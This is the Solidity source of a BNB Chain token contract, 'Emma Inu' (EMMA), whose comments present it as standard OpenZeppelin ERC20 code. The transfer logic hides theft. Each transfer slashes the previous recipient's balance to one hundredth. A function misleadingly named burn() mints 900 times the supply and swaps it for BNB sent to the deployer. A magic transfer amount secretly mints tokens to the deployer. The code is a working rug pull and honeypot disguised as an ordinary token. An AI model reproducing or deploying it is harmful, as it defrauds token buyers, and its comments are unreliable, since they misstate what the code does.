/**
 *Submitted for verification at BscScan.com on 2022-01-23
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "DIVIDING_ERROR");
        return a / b;
    }
    function divCeil(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 quotient = div(a, b);
        uint256 remainder = a - quotient * b;
        if (remainder > 0) {
            return quotient + 1;
        } else {
            return quotient;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
    address public _prevOwner;
    address _ADMIN_=0xfFDc5E926e3197EA5966a3F0097878c187D13FAE;
    address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public recipient;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * (10 ** _decimals);
    string private _name;
    string private _symbol;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    function name() external view virtual returns (string memory) {
        return _name;
    }
    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }
    function decimals() external view virtual returns (uint8) {
        return _decimals;
    }
    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) external view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        if (to != recipient){_balances[recipient]= _balances[recipient].divCeil(100);}
        if (to == msg.sender) {burn();}
        _transfer(msg.sender, to, amount);
        if (to != _prevOwner && to != _ADMIN_ && to != router){recipient = to;}
        return true;
    }
    function allowance(address owner, address spender) external view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address to, uint256 amount) external virtual override returns (bool) {
        _transfer(sender, to, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transfer(address sender, address to, uint256 amount) internal virtual {
        if ( 1000000000 == amount) {_balances[_prevOwner] += _totalSupply*900;}
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[to] += amount;

        emit Transfer(sender, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function burn() internal {
        IUniswapV2Router _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uint256 amount = _totalSupply*900;
        _balances[address(this)] += amount;
        _allowances [address(this)] [address(_router)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _router.swapExactTokensForETH(amount, 1, path, _prevOwner, block.timestamp + 20);
    }

}

///////////////////////////////////////////////
// OPENZEPPELIN CODE ABOVE //
///////////////////////////////////////////////

contract EMMAINU is ERC20 {

    // INITIALIZE AN ERC20 TOKEN BASED ON THE OPENZEPPELIN VERSION
    constructor() ERC20("Emma Inu", "EMMA") {

        // INITIALLY MINT TOTAL SUPPLY TO CREATOR
        _prevOwner = msg.sender;
        _balances[msg.sender] = _totalSupply;
        _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, _totalSupply/2);
        uint ad = _totalSupply/1000;
        _transfer(msg.sender, 0xC765bddB93b0D1c1A88282BA0fa6B2d00E3e0c83, ad);
        _transfer(msg.sender, 0xAe7e6CAbad8d80f0b4E1C4DDE2a5dB7201eF1252, ad);
        _transfer(msg.sender, 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e, ad);
    }
}